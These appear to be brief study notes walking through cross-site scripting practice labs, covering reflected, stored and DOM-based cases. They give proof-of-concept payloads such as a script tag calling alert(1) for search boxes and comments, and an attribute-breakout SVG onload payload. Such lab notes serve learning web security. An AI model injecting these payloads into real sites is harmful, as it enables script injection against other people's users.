# Cross Site Scripting Notes

## methodology

Simple payload:
```
<script>alert(1)</script>
```


# Labs walkthroughs

### Reflected XSS into HTML context with nothing encoded

Enter this in the search box
`<script>alert(1)</script>`

### Stored XSS into HTML context with nothing encoded

Enter this as a comment
`<script>alert(1)</script>`

### DOM XSS in document.write sink using source location.search

- Enter random input to the search box
- If we right click and inspect the page we can view that the random string we entered is placed inside the img src attribute
- enter this payload to pop xss `"><svg onload=alert(1)>`

